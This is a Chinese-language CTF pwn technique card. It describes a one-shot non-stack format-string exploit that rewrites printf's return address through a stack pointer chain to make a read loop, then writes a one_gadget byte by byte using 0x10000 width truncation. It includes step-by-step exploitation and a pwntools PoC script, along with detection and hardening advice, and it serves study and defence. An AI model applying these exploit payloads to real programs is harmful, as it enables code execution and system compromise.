---
id: binary-pwn-format-string-nonstack-single-shot-loop-high-byte-truncation
title: 单次非栈上格式化字符串：三级指针链把 printf 返回地址改回 read 造循环，再用 0x10000 高位截断逐字节写 one_gadget
type: scenario
domain: binary
path: binary/pwn/format-string
technique: nonstack-format-string-printf-ret-loop-high-byte-truncation
aliases:
- 非栈上格式化字符串
- 一次格式化字符串造循环
- printf 返回地址改 read
- 0x10000 高位截断
- 高位截断 %hhn
- 格式化字符串多次利用
- 三级指针链格式化
tags:
- pwn
- format-string
- non-stack
- pointer-chain
- return-address
- hhn
- high-byte-truncation
- one-gadget
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T08:52:44+08:00'
  notes: 已对照原文与14张截图核对：程序为 printf(Gift/&savedregs-12)+read(0,buf,0x100)+printf(buf)+_exit(0)，buf 在 .bss，Full RELRO/PIE/无canary 与截图一致；main+147 返回地址经 arg11→arg39 链改到 0x1223（mov edx,0x100;call read）造循环、0x100023 截断写 0x23、最后写 ret 均已逐图确认。未验证点：原文未给出 getshell 截图（末尾仅 ia() 交互），$ 预取 args_value 结论为作者经验性推断，故 confidence 保持 medium。
---

## 一句话结论

当目标程序只给一次 `printf(buf)`、格式串本体不在栈上、且随后直接 `_exit` 时，可以先用栈上现成的多级指针链（`arg11 → arg39 → argv[0]`）把 `printf` 的返回地址低字节从 `main+147` 改成 `main` 里 `read` 的调用点，让每次 `printf` 返回后重新 `read` 一次，凭空造出「可反复利用」的格式化循环；之后每轮固定写 `0x23` 维持循环，用 `%27$hn`/`%41$hn` 把指针链节点逐 2 字节搬到目标栈槽，把 one_gadget 写进 `printf` 返回地址上方的栈，最后把返回地址改成 `ret` 完成两级 ret 跳转。写入时用 `0x10000 + 目标字节` 的打印宽度解决「已输出字符数超过目标值、无法回退」的问题。

## 原理

- **为什么非栈上就写不了**：`%n` 的语义是「把已输出字符数写到第 k 个参数槽里的指针所指地址」。格式串放在 `.bss`（`read(0, buf, 0x100); printf(buf)`）时，攻击者无法把目标地址塞进格式串尾部并被某个参数槽引用，只能借用**栈上已有的**参数槽和指针链。
- **为什么改 printf 返回地址能造循环**：`main` 里调 `printf(buf)` 的那条 `call` 把返回地址压栈（`main+147`）。用 `%hn` 改这个返回地址的低 2 字节指向保存它的那个栈槽，再用 `%39$hhn` 只改它本身的低 1 字节，就能把 `main+147`（`0x123c`）变成 `main+0x1223`（`call read` 处）——高位 `0x12` 不变，只需改 `0x3c → 0x23`。此后 `printf` 一返回就落进 `read`，读完继续 `printf(buf)`，等于把「一次性」变成「无限次」。原程序末尾的 `_exit(0)` 因此永远执行不到。
- **为什么 0x10000 高位截断是必需的**：`%hhn` 写入的是已输出字符数的低 8 位，而字符数只会增加。第一步为了改指针已经输出了 `printf_ret_addr` 个字符（远大于 `0x23`），再也无法「回退」到 `0x23`。做法是打印 `0x100023 - 已输出` 个字符，使总数变成 `0x100023`，`%hhn` 截取低 8 位恰好得到 `0x23`。代价是每次要多打约 64KB，但 stdout 已 `setbuf(NULL)` 关闭缓冲，功能上可行，只是慢。
- **为什么必须动指针链而不是直接写**：`arg39` 槽里存的不是目标地址，而是「指向某栈字符串（`argv[0]`）的指针」；`arg11` 槽里存的是指向 `arg39` 那个槽的指针。先 `%hn` 把 `arg39` 槽的内容改成 `printf` 返回地址，`arg39` 才变成可写目标——这就是「借指针链中转」。
- **为什么同一链上不能连着用两次 `$`**：作者调试发现，先 `%11$hn` 改链、再 `%39$hhn` 写目标时第二次写无效，写到了**原来**的 `argv[0]` 字符串上（`./pwn` 变成 `#/pwn`）。作者的结论是：glibc `printf` 处理 `%k$` 时先解析完整格式串，把 1..max(k) 号参数一次性预取到内部的 `args_value` 数组，之后再用这份快照，所以运行期改栈不会影响已取好的值；而顺序（不带 `$`）的转换在格式化过程中按参数指针推进，能看到刚被改写的栈内容。**这是经验性结论，依赖具体 glibc 实现，未在源码级完全证实**，所以本卡 `confidence: medium`，实际利用需按目标 libc 复测。
- **为什么最后要写 `ret`**：one_gadget 需要特定寄存器/栈条件，直接跳过去经常不满足。把 one_gadget 的 6 字节先写在 `printf` 返回地址**上方**那个 qword（即 `ret` 之后 `rsp` 指向的位置），再把 `printf` 返回地址改成一条 `ret` 指令，`printf` 返回 → `ret` → 弹出 one_gadget 并跳过去，等于白送一次 `ret` 滑动，比直接覆盖返回地址更容易命中约束。

## 触发条件

- 存在 `printf(buf)` 类直接把输入当格式串的调用，且 `buf` 在 `.bss`/堆等非栈区域。
- 程序只给一次输入/一次 `printf`（或次数远少于利用所需），但泄漏了一个栈地址，且栈上存在可用的**多级**指针链（A→B→可控数据）。
- `printf` 的返回地址与主逻辑在同一函数内、低字节可被改成另一处 `call read` 之类的「重新读入」代码，且改动后高位字节无需变（同一 256 字节页内）。
- 二进制 PIE + Full RELRO（GOT 不可写）也可用——本手法完全绕开 GOT；无 canary 更好，但不是必要条件。
- 已有 libc 或代码基址泄漏/可通过同一格式化串泄露（本例用 `%p` 顺带泄 `libc` 与 `elf` 基址）。
- 没有对 `%`/`$`/`n` 的过滤，或过滤可绕过。

## 利用步骤

1. `checksec` 记录保护；在 `call printf` 处下断点，`tele rsp-8 30` 观察栈，标出：格式串参数槽、`printf` 返回地址、所有「指向栈的指针槽」及其层级（形如 `A → B → C`）。
2. 用 `%p` 序列确认参数索引（本例 `arg11` 指向 `arg39` 槽，`arg39` 槽指向 `argv[0]` 字符串），确认 `printf` 返回地址相对泄漏栈地址的偏移。
3. **第一步造循环**：`%p`×9 垫输出量 → `%<printf_ret_addr-90>c%hn`（顺序取参，把 `arg39` 槽内容改成 `printf` 返回地址）→ `%<0x100023-printf_ret_addr>c%39$hhn`（只改低字节为 `0x23`）。
4. 泄漏：`printf` 现在返回到 `read`，继续 `recv` 同一份格式串输出的 `0x...` 十六进制，算 `libc_base`、`elf_base`、`one_gadget`。
5. **第二步往栈上铺 one_gadget**：每轮固定 `%23c%39$hhn` 维持循环，再用 `%<目标16位-0x23>c%27$hn` 把指针链节点（如 `0x7fffffffe068 → 0x7fffffffdf50`）逐 2 字节改成「one_gadget 各段所在的栈地址」；配 `%<片段-0x23>c%41$hn` 把该 2 字节片段写进去。重复 3 次（低 16 位、中 16 位、高 16 位），把 6 字节 one_gadget 落到 `printf` 返回地址上方的 qword。
6. **第三步收尾**：`%<ret_gadget低字节>c%39$hhn` 把 `printf` 返回地址改成 `ret` 指令，`printf` 返回后 `ret` → one_gadget。
7. 交互拿 shell；若 one_gadget 约束不满足，改用 ROP 链（同样写在上方栈区）。

## PoC

```python
# 程序: printf("Gift: %x\n", &savedregs-12); read(0, buf, 0x100); printf(buf); _exit(0);
io.recvuntil(b'Gift: ')
stack_addr     = int(io.recv(4), 16)          # 低 4 位十六进制, 自行补高位
printf_ret     = stack_addr - 0xc             # printf 返回地址（main+147）

# 1) 造循环：arg11 槽 -> 指向 printf 返回地址；再把低字节改成 main+0x1223（call read）
p  = b'%p' * 9                                # 垫 90 字节输出
p += b'%' + str(printf_ret - 90).encode() + b'c%hn'                 # 顺序取参, 改指针槽
p += b'%' + str(0x100023 - printf_ret).encode() + b'c%39$hhn'       # 0x100023 & 0xff = 0x23
io.send(p.ljust(0x100, b'\x00'))

# 2) 现在每轮 printf 都会返回到 read: 固定 0x23 维持循环, 用 arg27/arg41 搬指针写 one_gadget
def stage(fmt_args):
    q  = b'%23c%39$hhn'                       # 恒定: 保持返回地址低字节 = 0x23
    q += fmt_args
    io.send(q.ljust(0x100, b'\x00'))

# 把 one_gadget 的 3 个 16 位片段依次写入 printf_ret+8
for i in range(3):
    stage(b'%' + str(((stack_addr - 4 + 2*i) - 0x23)).encode() + b'c%27$hn')
    stage(b'%' + str((((one_gadget >> (16*i)) & 0xffff) - 0x23)).encode() + b'c%41$hn')

# 3) 返回地址低字节改成 ret gadget, ret -> one_gadget
io.send((b'%' + str(ret_low).encode() + b'c%39$hhn').ljust(0x100, b'\x00'))
```

说明：`%hn`/`%hhn` 的参数序号（11/27/39/41）与 `stack_addr - 4` 这类链节点偏移**全是本题栈布局的实测值**，换二进制/换 libc 必须重测；`$` 与顺序取参的混用规则见「原理」倒数第二条。

## 变体与关联

- 变体：把返回地址改成代码里另一处 `read`/`gets` 调用点，效果相同；只要低字节落在同一 256B 页面即可一次 `hhn` 完成。
- 变体：没有 `printf` 返回值可利用时，改 `__libc_start_main` 返回地址、`.fini_array` 或退出钩子同样能重启主逻辑（另见 fini_array 循环卡片）。
- 变体：`0x10000` 高位截断只适用于 `%hhn`；要写 2 字节时用 `0x10000 + target16` 配 `%hn`（超过 `0xffff` 时同理用更高倍数），本质是「用溢出取模代替回退」。
- 变体：若一次输出 64KB 太慢/超时，改为第一次只构造循环、之后每轮只写 1 字节逐步逼近目标（牺牲轮数换字符数）。
- 关联：[[binary-pwn-format-string-nonstack-pointer-chain-got-overwrite]]（同为非栈上指针链中转，但靠多轮小输入写 GOT）、[[binary-pwn-format-string-non-stack-fini-array-loop-write]]（用 `.fini_array` 换多轮）、[[binary-pwn-format-string-one-shot-stack-return-address-two-n-writes]]（栈上一次性两次 `%n`）、[[binary-pwn-format-string-limited-nonstack-loop-condition-byte-rop]]。
- 边界：`printf` 返回地址与目标 `read` 不在同一 256 字节页 → 需要 2 字节写，第一步成本上升；栈上没有可用的多级指针链 → 该手法退回 `fmtstr_payload` 常规解；glibc 若改变位置参数预取行为（`$` 与顺序混用规则变化），第二步的「先 `%hn` 后 `%39$hhn`」组合需重新验证。

## 检测与防御

- 修复：所有输出改为 `printf("%s", buf)`；`-Wformat-security -Werror=format-security`、`-D_FORTIFY_SOURCE=2`；禁止把外部输入直接当格式串。
- 加固：Full RELRO + PIE + Canary 提高门槛（本手法绕 GOT，但仍需栈/代码泄漏）；`_exit` 前不留下二次可执行路径；避免在同一函数里把「读入」和「输出」放在一起，减少返回地址改一处即可循环的便利。
- 检测：输入中出现大量 `%p`、超长 `%<五位数>c`（宽度接近 65536 的倍数）、`%<n>$hhn` 与 `%<n>$hn` 混用；进程长时间高频 write 到 stdout；同一进程反复读同一缓冲区。
- 响应：崩溃现场检查 `printf` 返回地址是否指向非调用点、栈上是否出现 one_gadget 特征地址、是否有异常 `sh` 子进程。
